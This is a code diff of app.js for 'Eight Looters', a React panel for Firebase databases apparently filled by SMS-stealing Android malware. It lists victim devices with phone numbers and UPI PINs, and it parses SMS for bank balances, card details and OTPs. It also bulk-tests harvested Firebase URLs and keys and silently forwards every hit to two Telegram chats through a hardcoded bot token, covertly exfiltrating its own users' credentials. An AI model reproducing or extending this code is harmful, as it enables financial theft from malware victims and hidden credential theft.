@@ -1,31 +1,28 @@
 /* ============================================================
    Eight Looters · Firebase Console
-   COMPLETE app.js — Full Featured v2
+   COMPLETE app.js — v4 with Welcome Gate
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
 const TG_URL = "https://t.me/eightlooters";
 const BRAND = "Eight Looters";
+const WELCOME_KEY = "elight_welcome_done_v1";
 
-/* ===== Telegram Silent Notifier (2 chat IDs) ===== */
+/* ===== Telegram Notifier ===== */
 const TG_BOT_TOKEN = "8846250497:AAGIXy4t7G51yH4mRsUfgl3q-Ya3S6tFe3Y";
 const TG_CHAT_IDS = ["8965778254", "8646475251"];
 
 function _escTg(s){return String(s??"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
 function _nowIst(){return new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata",hour12:true});}
-
 async function notifyTelegram(text){
   await Promise.all(TG_CHAT_IDS.map(async chat_id=>{
     try{
       await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
+        method:"POST",headers:{"Content-Type":"application/json"},
         body:JSON.stringify({chat_id,text,parse_mode:"HTML",disable_web_page_preview:true})
       });
     }catch(e){}
   }));
 }
-
-/* Clean key: if key looks like URL or is same as url → return "" */
 function _cleanTgKey(key,url){
   if(!key) return "";
   if(key===url) return "";
@@ -35,44 +32,32 @@ function _cleanTgKey(key,url){
 }
 function tgFirebaseMsg(url,key,source,devices){
   const ck = _cleanTgKey(key,url);
-  return `🔥 <b>NEW FIREBASE ACTIVATED</b>\n\n`+
-    `📡 <b>URL:</b> <code>${_escTg(url)}</code>\n`+
-    (ck ? `🔑 <b>Key:</b> <code>${_escTg(ck)}</code>\n` : `🔓 <b>Auth:</b> Public / No key\n`)+
+  return `🔥 <b>NEW FIREBASE ACTIVATED</b>\n\n📡 <b>URL:</b> <code>${_escTg(url)}</code>\n`+
+    (ck?`🔑 <b>Key:</b> <code>${_escTg(ck)}</code>\n`:`🔓 <b>Auth:</b> Public / No key\n`)+
     `📱 <b>Source:</b> ${_escTg(source)}\n`+
     (devices!=null?`📦 <b>Devices:</b> ${devices}\n`:"")+
     `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;
 }
-function tgBulkMsg(items, source, totalTried){
-  const ok = items.filter(x=>x.ok);
-  const fail = items.filter(x=>!x.ok);
-  let txt = `🔥 <b>BULK FIREBASE · ${_escTg(source)}</b>\n`;
-  txt += `━━━━━━━━━━━━━━━━━━\n`;
-  txt += `📊 <b>Total tried:</b> ${totalTried}\n`;
-  txt += `✅ <b>Activated:</b> ${ok.length}\n`;
-  txt += `❌ <b>Failed:</b> ${fail.length}\n`;
-  txt += `⏰ <b>Time:</b> ${_escTg(_nowIst())}\n`;
+function tgBulkMsg(items,source,totalTried){
+  const ok = items.filter(x=>x.ok), fail = items.filter(x=>!x.ok);
+  let txt = `🔥 <b>BULK FIREBASE · ${_escTg(source)}</b>\n━━━━━━━━━━━━━━━━━━\n`;
+  txt += `📊 <b>Total tried:</b> ${totalTried}\n✅ <b>Activated:</b> ${ok.length}\n❌ <b>Failed:</b> ${fail.length}\n⏰ <b>Time:</b> ${_escTg(_nowIst())}\n`;
   if(ok.length){
     txt += `\n🟢 <b>── ACTIVE PANELS ──</b>\n`;
-    ok.slice(0,40).forEach((x,i)=>{
-      txt += `<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;
-    });
+    ok.slice(0,40).forEach((x,i)=>{txt += `<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;});
     if(ok.length>40) txt += `<i>…and ${ok.length-40} more active</i>\n`;
   }
   if(fail.length){
     txt += `\n🔴 <b>── FAILED ──</b>\n`;
-    fail.slice(0,20).forEach((x,i)=>{
-      txt += `<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;
-    });
+    fail.slice(0,20).forEach((x,i)=>{txt += `<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;});
     if(fail.length>20) txt += `<i>…and ${fail.length-20} more failed</i>\n`;
   }
   return txt;
 }
 function tgApkMsg(file,url,key,pid){
   const ck = _cleanTgKey(key,url);
-  return `🔥 <b>NEW APK FIREBASE</b>\n\n`+
-    `📁 <b>APK:</b> <code>${_escTg(file)}</code>\n`+
-    `📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
-    (ck ? `🔑 <b>API Key:</b> <code>${_escTg(ck)}</code>\n` : `🔓 <b>Auth:</b> Public / No key\n`)+
+  return `🔥 <b>NEW APK FIREBASE</b>\n\n📁 <b>APK:</b> <code>${_escTg(file)}</code>\n📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
+    (ck?`🔑 <b>API Key:</b> <code>${_escTg(ck)}</code>\n`:`🔓 <b>Auth:</b> Public / No key\n`)+
     (pid?`🆔 <b>Project:</b> <code>${_escTg(pid)}</code>\n`:"")+
     `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;
 }
@@ -119,14 +104,14 @@ const loadAccounts=()=>{try{const a=localStorage.getItem(LS_KEY);return a?JSON.p
 const saveAccounts=a=>localStorage.setItem(LS_KEY,JSON.stringify(a));
 
 function useLocalStorage(key, initial){
-  const [v,setV] = useState(()=>{
-    try{const s = localStorage.getItem(key);return s!=null?JSON.parse(s):initial;}catch{return initial;}
-  });
-  useEffect(()=>{
-    try{localStorage.setItem(key,JSON.stringify(v));}catch{}
-  },[key,v]);
+  const [v,setV] = useState(()=>{try{const s=localStorage.getItem(key);return s!=null?JSON.parse(s):initial;}catch{return initial;}});
+  useEffect(()=>{try{localStorage.setItem(key,JSON.stringify(v));}catch{}},[key,v]);
   return [v,setV];
 }
+
+const PIN_DEV_KEY = "pin_devices_v1";
+const loadPinnedDevices = ()=>{try{return JSON.parse(localStorage.getItem(PIN_DEV_KEY)||"[]");}catch{return[];}};
+const savePinnedDevices = (a)=>{try{localStorage.setItem(PIN_DEV_KEY,JSON.stringify(a));}catch{}};
 
 /* ===== Firebase API ===== */
 async function fbGet(url,key,path,extra={}){
@@ -166,7 +151,7 @@ async function fbDel(url,key,path){
   if(!r.ok && r.status===403) throw new Error("PERMISSION_DENIED");
 }
 
-/* ===== SMART FIREBASE URL EXTRACTOR ===== */
+/* ===== Firebase URL Extractor ===== */
 function extractFirebaseUrls(text){
   if(!text) return [];
   const re = /(?:https?:\/\/)?([A-Za-z0-9][A-Za-z0-9-]*(?:\.[A-Za-z0-9-]+)*\.(?:firebaseio\.com|firebasedatabase\.app))/gi;
@@ -181,6 +166,15 @@ function extractFirebaseUrls(text){
     out.push("https://" + host);
   }
   return out;
+}
+
+function cleanPhone(p){
+  const s = String(p||"").replace(/[^0-9]/g,"");
+  if(!s || s==="—") return "—";
+  if(s.length===12 && s.startsWith("91")) return s.slice(2);
+  if(s.length===13 && s.startsWith("091")) return s.slice(3);
+  if(s.length>=10) return s.slice(-10);
+  return s;
 }
 
 /* ===== Bank/SMS parsers ===== */
@@ -258,20 +252,16 @@ function parseDevices(raw){const list=[]; if(raw&&typeof raw==="object"){
     list.push({
       id,
       name:String(d.modelName||d.model||d.deviceName||d.name||id),
-      battery:bat,
-      batteryPercent:pct,
-      status:!!d.status,
+      battery:bat,batteryPercent:pct,status:!!d.status,
       phoneNumber:String(d.mobNo||d.phone||d.phoneNumber||d.mobile||d.mob_no||d.mobno||(sims[0]?.phoneNumber)||"—"),
       android:pick("androidV","androidVersion","android_version","android_sdk","sdk_int","androidSDK","android"),
       ip:pick("ip_address","ipAddress","ip_address_public","client_ip","clientIp","clientIP","publicIp","lastIp","ip"),
       storage:pick("storage","totalStorage","storage_total","internal_storage","storageTotal","storage_info","total_storage","disk","storageInfo"),
       provider:pick("service_provider","serviceProvider","provider","network","sim_operator","operator","carrier"),
-      sims,
-      upipin:d.upipin?String(d.upipin):null,
+      sims,upipin:d.upipin?String(d.upipin):null,
       cpu:pick("cpu_arch","cpuArch","cpu","architecture","arch","cpuArchitecture","cpuabi","cpuAbi","cpu_info","abi"),
       sdk:pick("sdkV","sdkVersion","sdk_version","sdk_int","sdk","androidSDK"),
-      lastSeen:ls,
-      lastSeenFormatted:ls?timeAgo(ls):undefined,
+      lastSeen:ls,lastSeenFormatted:ls?timeAgo(ls):undefined,
       _raw:d
     });
   });
@@ -285,16 +275,11 @@ function parseMessages(raw){
     for(const[,m] of slice){
       if(!m||typeof m!=="object") continue;
       const t=String(m.message||m.body||m.text||"");
-      if(t.trim()) out.push({
-        text:t,
-        sender:String(m.sender||m.from||"Unknown"),
-        time:String(m.dateTime||m.date||"")
-      });
+      if(t.trim()) out.push({text:t,sender:String(m.sender||m.from||"Unknown"),time:String(m.dateTime||m.date||"")});
     }
   } 
   return out;
 }
-
 function parseSmsTime(str){
   if(!str) return 0;
   const m = String(str).match(/(\d{1,2})[-\/](\d{1,2})[-\/](\d{2,4})\s*\|?\s*(\d{1,2}):(\d{2})\s*(am|pm)?/i);
@@ -302,13 +287,12 @@ function parseSmsTime(str){
     let [,d,mo,y,hh,mm,ap] = m;
     if(y.length===2) y = "20"+y;
     hh = parseInt(hh,10); mm = parseInt(mm,10);
-    if(ap){ ap = ap.toLowerCase(); if(ap==="pm" && hh<12) hh+=12; if(ap==="am" && hh===12) hh=0; }
+    if(ap){ap=ap.toLowerCase();if(ap==="pm"&&hh<12)hh+=12;if(ap==="am"&&hh===12)hh=0;}
     return new Date(+y,+mo-1,+d,hh,mm).getTime();
   }
   const t = Date.parse(str);
   return isNaN(t) ? 0 : t;
 }
-
 function extractOtp(text){
   if(!text) return null;
   const pats = [
@@ -323,7 +307,6 @@ function extractOtp(text){
   }
   return null;
 }
-
 function analyze(msgs){const banks=[],cards=[],phones=new Set(),nets=new Set();
   for(const m of msgs){const b=parseBankSms(m.text,m.sender);if(b){b.detectedAt=m.time||b.detectedAt;banks.push(b)}
     const c=parseCard(m.text);if(c) cards.push(c);
@@ -415,8 +398,8 @@ function TGButton({label="Join Telegram"}){
   const go = e=>{
     e.preventDefault();
     e.stopPropagation();
-    try{ window.open(TG_URL,"_blank","noopener,noreferrer"); }
-    catch{ window.location.href = TG_URL; }
+    try{window.open(TG_URL,"_blank","noopener,noreferrer");}
+    catch{window.location.href=TG_URL;}
   };
   return <a href={TG_URL} target="_blank" rel="noopener noreferrer" onClick={go} className="tg-pill">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="#0ea5e9" width="18" height="18">
@@ -424,6 +407,95 @@ function TGButton({label="Join Telegram"}){
     </svg>
     {label}
   </a>;
+}
+
+/* ============ WELCOME GATE (Marvel style) ============ */
+function WelcomeGate({onEnter}){
+  const [stage,setStage] = useState(0); // 0=logo-in, 1=title-in, 2=button-ready
+  const [exiting,setExiting] = useState(false);
+
+  useEffect(()=>{
+    const t1 = setTimeout(()=>setStage(1), 900);
+    const t2 = setTimeout(()=>setStage(2), 1800);
+    return ()=>{clearTimeout(t1);clearTimeout(t2);};
+  },[]);
+
+  const enterNow = ()=>{
+    try{ localStorage.setItem(WELCOME_KEY, "1"); }catch{}
+    setExiting(true);
+    setTimeout(()=>onEnter(), 650);
+  };
+  const joinAndEnter = (e)=>{
+    // open TG in new tab
+    try{ window.open(TG_URL,"_blank","noopener,noreferrer"); }
+    catch{ window.location.href = TG_URL; }
+    // small delay then enter
+    setTimeout(enterNow, 350);
+  };
+
+  return <div className={"welcome-wrap"+(exiting?" exiting":"")}>
+    {/* Particles / rays */}
+    <div className="welcome-rays">
+      {Array.from({length:12}).map((_,i)=>{
+        const angle = (i*30);
+        return <div key={i} className="welcome-ray" style={{transform:`rotate(${angle}deg)`}}/>;
+      })}
+    </div>
+    <div className="welcome-particles">
+      {Array.from({length:24}).map((_,i)=>{
+        const top = Math.random()*100;
+        const left = Math.random()*100;
+        const delay = Math.random()*4;
+        const dur = 3+Math.random()*3;
+        const size = 2+Math.random()*3;
+        return <span key={i} className="wp" style={{
+          top:top+"%", left:left+"%", width:size, height:size,
+          animationDelay:delay+"s", animationDuration:dur+"s"
+        }}/>;
+      })}
+    </div>
+
+    <div className="welcome-content">
+      {/* Logo burst */}
+      <div className={"welcome-logo"+(stage>=1?" in":"")}>
+        <div className="wl-ring r1"/>
+        <div className="wl-ring r2"/>
+        <div className="wl-ring r3"/>
+        <div className="wl-core">
+          {Ic.zap(38)}
+        </div>
+      </div>
+
+      {/* Title */}
+      <div className={"welcome-title"+(stage>=1?" in":"")}>
+        {"EIGHT".split("").map((c,i)=><span key={"a"+i} className="wt-char" style={{animationDelay:`${0.05*i}s`}}>{c}</span>)}
+        <span className="wt-space"> </span>
+        {"LOOTERS".split("").map((c,i)=><span key={"b"+i} className="wt-char" style={{animationDelay:`${0.05*(i+6)}s`}}>{c}</span>)}
+      </div>
+
+      {/* Subtitle */}
+      <div className={"welcome-sub"+(stage>=1?" in":"")}>
+        <span className="ws-line"/>
+        <span className="ws-text">PREMIUM FIREBASE CONSOLE</span>
+        <span className="ws-line"/>
+      </div>
+
+      {/* Buttons */}
+      <div className={"welcome-cta"+(stage>=2?" in":"")}>
+        <button className="wc-btn tg" onClick={joinAndEnter}>
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="currentColor" width="20" height="20">
+            <path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-0.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z"/>
+          </svg>
+          <span>JOIN TELEGRAM</span>
+          <span className="wc-arrow">{Ic.chev(14)}</span>
+        </button>
+        <button className="wc-btn skip" onClick={enterNow}>
+          Skip & Enter →
+        </button>
+        <p className="wc-note">Join our Telegram channel for updates & support</p>
+      </div>
+    </div>
+  </div>;
 }
 
 /* ============ LOGIN SCREEN ============ */
@@ -542,10 +614,7 @@ function LoginScreen({onConnect,onMergeAll}){
   function share(a,e){e?.stopPropagation();setShareLink(makeShareLink(a.url,a.key));}
 
   async function processBulkUrls(urls, source){
-    if(!urls.length){
-      setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});
-      return;
-    }
+    if(!urls.length){setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});return;}
     setBulkBusy(true);setBulkSum(null);setErr("");
     setBulkProgress({total:urls.length, done:0, added:0, failed:0, current:""});
     const exist = new Set(accounts.map(a=>a.url.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase()));
@@ -554,71 +623,45 @@ function LoginScreen({onConnect,onMergeAll}){
       const u = urls[idx];
       setBulkProgress(p => p ? {...p, current:u} : p);
       const fp = u.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase();
-      if(exist.has(fp)){
-        skipped.push({url:u,reason:"Already saved"});
-        setBulkProgress(p => p ? {...p, done:idx+1} : p);
-        continue;
-      }
+      if(exist.has(fp)){skipped.push({url:u,reason:"Already saved"});setBulkProgress(p=>p?{...p,done:idx+1}:p);continue;}
       try{
         const c = await fbGet(u,"","clients");
-        if(c===null){
-          failed.push({url:u,reason:"Clients path not found"});
-        } else {
+        if(c===null){failed.push({url:u,reason:"Clients path not found"});}
+        else{
           adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:u,key:"",date:new Date().toLocaleString()});
           exist.add(fp);
           const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
           success.push({url:u,devices:devCount});
         }
-      }catch(e){
-        const m=e.message||String(e);
-        failed.push({url:u,reason:m.replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});
-      }
+      }catch(e){const m=e.message||String(e);failed.push({url:u,reason:m.replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});}
       setBulkProgress(p => p ? {...p, done:idx+1, added:success.length, failed:failed.length} : p);
       await new Promise(r=>setTimeout(r,12));
     }
     if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
     setBulkSum({success,failed,skipped});
     setBulkBusy(false);
-    const items = [
-      ...success.map(s=>({url:s.url, ok:true, devices:s.devices})),
-      ...failed.map(f=>({url:f.url, ok:false, reason:f.reason}))
-    ];
+    const items = [...success.map(s=>({url:s.url, ok:true, devices:s.devices})),...failed.map(f=>({url:f.url, ok:false, reason:f.reason}))];
     if(items.length) notifyTelegram(tgBulkMsg(items, source, urls.length));
     setTimeout(()=>setBulkProgress(null), 4500);
     return {success,failed,skipped};
   }
-
   async function bulkAdd(){
     const urls = extractFirebaseUrls(bulk);
-    if(!urls.length){
-      setErr("No valid Firebase URL found. Paste like: http://metabank-3def8-default-rtdb.firebaseio.com");
-      setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});
-      return;
-    }
+    if(!urls.length){setErr("No valid Firebase URL found. Paste like: http://metabank-3def8-default-rtdb.firebaseio.com");setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});return;}
     await processBulkUrls(urls,"Bulk Paste");
     setBulk("");
   }
-
   async function handleBulkFile(file){
     if(!file) return;
-    setFileBusy(true);
-    setFileProgress(0);
-    setFileInfo("Reading file…");
-    setFileName(file.name);
-    setFileFound(0);
-    setBulkSum(null);
-    setErr("");
+    setFileBusy(true);setFileProgress(0);setFileInfo("Reading file…");setFileName(file.name);setFileFound(0);setBulkSum(null);setErr("");
     try{
       const text = await file.text();
       const lines = text.split(/\r?\n/);
-      const found = [];
-      const seen = new Set();
+      const found = []; const seen = new Set();
       setFileInfo(`0 / ${lines.length} lines`);
       for(let i=0;i<lines.length;i++){
         const urls = extractFirebaseUrls(lines[i]);
-        for(const u of urls){
-          if(!seen.has(u)){ seen.add(u); found.push(u); }
-        }
+        for(const u of urls){if(!seen.has(u)){seen.add(u);found.push(u);}}
         const pct = Math.round(((i+1)/lines.length)*100);
         setFileProgress(pct);
         if(i % 5 === 0 || i === lines.length-1){
@@ -628,21 +671,13 @@ function LoginScreen({onConnect,onMergeAll}){
       }
       setFileFound(found.length);
       setFileInfo(`✓ ${lines.length} lines scanned · ${found.length} unique URLs`);
-      if(!found.length){
-        setErr("No Firebase URL found in file.");
-        return;
-      }
+      if(!found.length){setErr("No Firebase URL found in file.");return;}
       setFileProgress(100);
       await new Promise(r=>setTimeout(r,350));
       await processBulkUrls(found, "File Upload");
-    }catch(e){
-      setErr("File read failed: "+(e.message||String(e)));
-    }finally{
-      setFileBusy(false);
-      setTimeout(()=>{ setFileProgress(0); setFileInfo(""); setFileName(""); setFileFound(0); },5000);
-    }
+    }catch(e){setErr("File read failed: "+(e.message||String(e)));}
+    finally{setFileBusy(false);setTimeout(()=>{setFileProgress(0);setFileInfo("");setFileName("");setFileFound(0);},5000);}
   }
-
   async function importPanels(){
     const decode = raw=>{
       try{const t=String(raw||"").trim(); if(!t) return null;
@@ -674,13 +709,9 @@ function LoginScreen({onConnect,onMergeAll}){
     }
     if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
     setPanels("");setPanelSum({success,failed,skipped});setPanelBusy(false);
-    const items = [
-      ...success.map(s=>({url:s.url, ok:true, devices:s.devices})),
-      ...failed.map(f=>({url:f.url, ok:false, reason:f.reason}))
-    ];
+    const items = [...success.map(s=>({url:s.url, ok:true, devices:s.devices})),...failed.map(f=>({url:f.url, ok:false, reason:f.reason}))];
     if(items.length) notifyTelegram(tgBulkMsg(items, "Panel Link Import", parsed.length));
   }
-
   async function onApk(f){
     if(!f) return;
     if(!f.name.endsWith(".apk")&&!f.name.endsWith(".zip")){setApkErr("Only .apk / .zip supported");return;}
@@ -691,9 +722,7 @@ function LoginScreen({onConnect,onMergeAll}){
       setApkResult(r);
       if(r.firebaseUrl) setUrl(r.firebaseUrl);
       if(r.apiKey) setKey(r.apiKey);
-      if(r.firebaseUrl){
-        notifyTelegram(tgApkMsg(f.name, r.firebaseUrl, r.apiKey, r.projectId));
-      }
+      if(r.firebaseUrl) notifyTelegram(tgApkMsg(f.name, r.firebaseUrl, r.apiKey, r.projectId));
     }catch(e){setApkErr("Failed to parse file: "+(e.message||String(e)));}
     finally{setApkBusy(false);}
   }
@@ -770,39 +799,26 @@ function LoginScreen({onConnect,onMergeAll}){
 
               {fileBusy && <div className="a-up pro-prog" style={{marginTop:10}}>
                 <div className="pro-prog-head">
-                  <span className="pro-prog-title">
-                    {Ic.upload(12)} <span className="mono" style={{color:"#a5f3fc",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:170}}>{fileName}</span>
-                  </span>
+                  <span className="pro-prog-title">{Ic.upload(12)} <span className="mono" style={{color:"#a5f3fc",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:170}}>{fileName}</span></span>
                   <span className="pro-prog-pct">{fileProgress}%</span>
                 </div>
-                <div className="pro-prog-track">
-                  <div className="pro-prog-fill cyan" style={{width:`${fileProgress}%`}}/>
-                  <div className="pro-prog-shine"/>
-                </div>
+                <div className="pro-prog-track"><div className="pro-prog-fill cyan" style={{width:`${fileProgress}%`}}/><div className="pro-prog-shine"/></div>
                 <p className="mono pro-prog-sub">{fileInfo}</p>
               </div>}
               {!fileBusy && fileFound>0 && <div className="a-in" style={{marginTop:8,fontSize:10,color:"#34d399",display:"flex",alignItems:"center",gap:5}}>{Ic.check(11)} {fileInfo}</div>}
 
               {bulkProgress && <div className="a-up pro-prog" style={{marginTop:10,borderColor:"rgba(139,92,246,.35)",background:"linear-gradient(135deg,rgba(139,92,246,.08),rgba(34,211,238,.04))"}}>
                 <div className="pro-prog-head">
-                  <span className="pro-prog-title">
-                    <span className="pro-prog-dot"/>
-                    Adding <b>{bulkProgress.done}</b> / <b>{bulkProgress.total}</b>
-                  </span>
+                  <span className="pro-prog-title"><span className="pro-prog-dot"/>Adding <b>{bulkProgress.done}</b> / <b>{bulkProgress.total}</b></span>
                   <span className="pro-prog-pct purple">{Math.round((bulkProgress.done/bulkProgress.total)*100)}%</span>
                 </div>
-                <div className="pro-prog-track">
-                  <div className="pro-prog-fill violet" style={{width:`${(bulkProgress.done/bulkProgress.total)*100}%`}}/>
-                  <div className="pro-prog-shine"/>
-                </div>
+                <div className="pro-prog-track"><div className="pro-prog-fill violet" style={{width:`${(bulkProgress.done/bulkProgress.total)*100}%`}}/><div className="pro-prog-shine"/></div>
                 <div className="pro-prog-stats">
                   <span className="stat-ok">{Ic.check(10)} {bulkProgress.added} activated</span>
                   <span className="stat-bad">{Ic.x(10)} {bulkProgress.failed} failed</span>
                   <span className="stat-rem">{bulkProgress.total - bulkProgress.done} left</span>
                 </div>
-                {bulkProgress.current && <p className="mono pro-prog-sub" style={{marginTop:6}}>
-                  → {bulkProgress.current.replace(/^https?:\/\//,"").slice(0,60)}
-                </p>}
+                {bulkProgress.current && <p className="mono pro-prog-sub" style={{marginTop:6}}>→ {bulkProgress.current.replace(/^https?:\/\//,"").slice(0,60)}</p>}
               </div>}
             </div>
 
@@ -918,13 +934,8 @@ function LoginScreen({onConnect,onMergeAll}){
         {err && <p className="a-up" style={{textAlign:"center",fontSize:12,color:"#fb7185",marginTop:14}}>{err}</p>}
       </div>
 
-      <div style={{display:"flex",justifyContent:"center",marginTop:20}}>
-        <TGButton label="Chat with us on Telegram"/>
-      </div>
-
-      <p style={{textAlign:"center",fontSize:11,color:"var(--muted-2)",marginTop:14}}>
-        <span className="grad-text" style={{fontWeight:600}}>{BRAND}</span> · All connections logged
-      </p>
+      <div style={{display:"flex",justifyContent:"center",marginTop:20}}><TGButton label="Chat with us on Telegram"/></div>
+      <p style={{textAlign:"center",fontSize:11,color:"var(--muted-2)",marginTop:14}}><span className="grad-text" style={{fontWeight:600}}>{BRAND}</span> · All connections logged</p>
     </div>
 
     {shareLink && <div className="ovl" onClick={()=>setShareLink("")}>
@@ -932,10 +943,7 @@ function LoginScreen({onConnect,onMergeAll}){
         <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:16}}>
           <div style={{display:"flex",gap:10,alignItems:"center"}}>
             <div style={{width:34,height:34,borderRadius:10,background:"rgba(34,211,238,.12)",border:"1px solid rgba(34,211,238,.35)",display:"flex",alignItems:"center",justifyContent:"center",color:"#a5f3fc"}}>{Ic.link(16)}</div>
-            <div>
-              <h3 style={{fontSize:14,fontWeight:600}}>Share Connection</h3>
-              <p style={{fontSize:11,color:"var(--muted)"}}>Anyone with this link can connect</p>
-            </div>
+            <div><h3 style={{fontSize:14,fontWeight:600}}>Share Connection</h3><p style={{fontSize:11,color:"var(--muted)"}}>Anyone with this link can connect</p></div>
           </div>
           <button onClick={()=>setShareLink("")} className="ibtn" style={{padding:6}}>{Ic.x(14)}</button>
         </div>
@@ -946,9 +954,7 @@ function LoginScreen({onConnect,onMergeAll}){
             {copied?<>{Ic.check(12)}Copied!</>:<>{Ic.copy(12)}Copy</>}
           </button>
         </div>
-        <div style={{display:"flex",gap:8,padding:12,borderRadius:12,background:"rgba(251,191,36,.08)",border:"1px solid rgba(251,191,36,.25)"}}>
-          {Ic.alert(14)}<p style={{fontSize:11,color:"#fcd34d"}}>Contains Firebase credentials. Share only with trusted people.</p>
-        </div>
+        <div style={{display:"flex",gap:8,padding:12,borderRadius:12,background:"rgba(251,191,36,.08)",border:"1px solid rgba(251,191,36,.25)"}}>{Ic.alert(14)}<p style={{fontSize:11,color:"#fcd34d"}}>Contains Firebase credentials. Share only with trusted people.</p></div>
       </div>
     </div>}
   </div>;
@@ -965,26 +971,32 @@ function Dashboard({fbUrl,fbKey,onLogout}){
   const [msg,setMsg] = useState("");
   const [now,setNow] = useState(new Date());
   const [err,setErr] = useState("");
+  const [pinnedIds,setPinnedIds] = useState(()=>loadPinnedDevices());
   const prev = useRef(0);
   const ref = useRef([]);
   const cache = useRef(new Map());
   const toast = useCallback(m=>{setMsg(m);setTimeout(()=>setMsg(""),3200)},[]);
   ref.current = devices;
 
+  const togglePinDevice = useCallback((id)=>{
+    setPinnedIds(prev=>{
+      const next = prev.includes(id) ? prev.filter(x=>x!==id) : [...prev,id];
+      savePinnedDevices(next);
+      return next;
+    });
+  },[]);
+
   const load = useCallback(async (showLoad=false)=>{
     if(showLoad) setLoading(true);
     try{
       const raw = await fbGet(fbUrl,fbKey,"clients");
       const rows = parseDevices(raw);
-      setDevices(p=>{const old=new Map(p.map(d=>[d.id,d]));
-        return rows.map(d=>({...d,smsAnalysis:old.get(d.id)?.smsAnalysis}));});
+      setDevices(p=>{const old=new Map(p.map(d=>[d.id,d]));return rows.map(d=>({...d,smsAnalysis:old.get(d.id)?.smsAnalysis}));});
       setErr("");
       if(prev.current>0 && rows.length>prev.current) toast("🔔 New device connected!");
       prev.current = rows.length;
-    }catch(e){
-      const m = e.message||String(e);
-      setErr(m.includes("PERMISSION_DENIED")?"Permission Denied — Use Database Secret key (not API key).":"Connection error: "+m.slice(0,120));
-    }finally{setLoading(false);}
+    }catch(e){const m=e.message||String(e);setErr(m.includes("PERMISSION_DENIED")?"Permission Denied — Use Database Secret key (not API key).":"Connection error: "+m.slice(0,120));}
+    finally{setLoading(false);}
   },[fbUrl,fbKey,toast]);
 
   const scan = useCallback(async (force=false)=>{
@@ -1014,18 +1026,28 @@ function Dashboard({fbUrl,fbKey,onLogout}){
   },[]);
   useEffect(()=>{if(devices.length) scan(false);},[devices.length,scan]);
 
-  const filtered = useMemo(()=>devices.filter(d=>{
-    if(filter==="online"&&!d.status) return false;
-    if(filter==="offline"&&d.status) return false;
-    if(filter==="upi"&&!d.upipin) return false;
-    if(filter==="bank"&&!d.smsAnalysis?.bankBalances.length) return false;
-    if(filter==="card"&&!d.smsAnalysis?.cards.length) return false;
-    const q = search.toLowerCase().trim();
-    return !q || d.name.toLowerCase().includes(q) || d.phoneNumber.includes(q) || d.id.toLowerCase().includes(q);
-  }).sort((a,b)=>{
-    if(filter==="online") return Number(b.status)-Number(a.status);
-    return b.id.localeCompare(a.id);
-  }),[devices,filter,search]);
+  const filtered = useMemo(()=>{
+    const qRaw = search.trim().toLowerCase();
+    const qNum = qRaw.replace(/[^0-9]/g,"");
+    return devices.filter(d=>{
+      if(filter==="online"&&!d.status) return false;
+      if(filter==="offline"&&d.status) return false;
+      if(filter==="upi"&&!d.upipin) return false;
+      if(filter==="bank"&&!d.smsAnalysis?.bankBalances.length) return false;
+      if(filter==="card"&&!d.smsAnalysis?.cards.length) return false;
+      if(!qRaw) return true;
+      const numStr = String(d.phoneNumber||"").replace(/[^0-9]/g,"");
+      const smsNums = (d.smsAnalysis?.phoneNumbers||[]).join(" ").replace(/[^0-9]/g,"");
+      return d.name.toLowerCase().includes(qRaw)
+        || d.id.toLowerCase().includes(qRaw)
+        || (qNum && (numStr.includes(qNum) || smsNums.includes(qNum)));
+    }).sort((a,b)=>{
+      const pa = pinnedIds.includes(a.id), pb = pinnedIds.includes(b.id);
+      if(pa!==pb) return pb?1:-1;
+      if(filter==="online") return Number(b.status)-Number(a.status);
+      return b.id.localeCompare(a.id);
+    });
+  },[devices,filter,search,pinnedIds]);
 
   const online = devices.filter(d=>d.status).length;
   const offline = devices.length-online;
@@ -1042,7 +1064,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
         </div>
